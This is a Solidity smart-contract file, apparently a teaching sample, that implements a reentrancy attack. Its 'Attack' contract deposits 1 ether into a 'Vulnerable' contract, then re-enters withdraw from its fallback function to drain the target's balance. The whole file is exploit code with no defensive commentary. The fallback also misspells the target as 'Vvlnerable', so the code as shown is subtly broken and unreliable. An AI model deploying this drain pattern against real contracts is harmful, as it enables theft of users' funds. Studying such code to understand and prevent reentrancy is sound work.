
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


contract Attack {
    Vulnerable public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = Vulnerable(_vulnerableAddress);
    }

    // Fallback is called when Vulnerable sends Ether to this contract.
    fallback() external payable {
        if (address(Vvlnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
